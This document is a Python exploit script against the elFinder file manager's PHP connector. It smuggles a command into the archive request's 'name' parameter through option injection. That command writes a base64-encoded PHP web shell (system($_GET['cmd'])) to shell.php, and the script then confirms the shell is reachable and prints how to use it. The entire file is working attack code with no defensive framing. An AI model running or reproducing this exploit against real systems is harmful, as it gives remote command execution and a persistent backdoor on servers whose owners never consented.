import requests, sys, base64


if len(sys.argv) < 2:
	print('Usage: python3 webshell.py http://<ip>:<port>/<elfinder path>')
	exit()

URL = sys.argv[1]
if (sys.argv[1]).endswith('/'):
    # Remove the trailing '/'
    URL = URL.rstrip('/')



# echo <?php system($_GET['cmd']); ?> > shell.php
# Base64 encode to prevent bad characters
payload = 'echo%20PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg%20%7C%20base64%20-d>shell.php'

#print(payload)
ENDPOINT = f'/php/connector.minimal.php?cmd=archive&name=-TvTT={payload}%20%23%202.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip'

#ENDPOINT = '/php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php # b.zip&target=l1_Lw&targets[1]=l1_Mi56aXA&targets[0]=l1_MS50eHQ&type=application/zip'
resp = requests.get(URL + ENDPOINT)

# Debug
print("Status code ", resp.status_code)
#print(resp.text)


check = requests.get(URL + '/files/shell.php')
#print(check.status_code)
if check.status_code == 200:
	print("[+] Webshell successfully written!!")
	print(f"Usage: {URL}/files/shell.php?cmd=<whoami>")

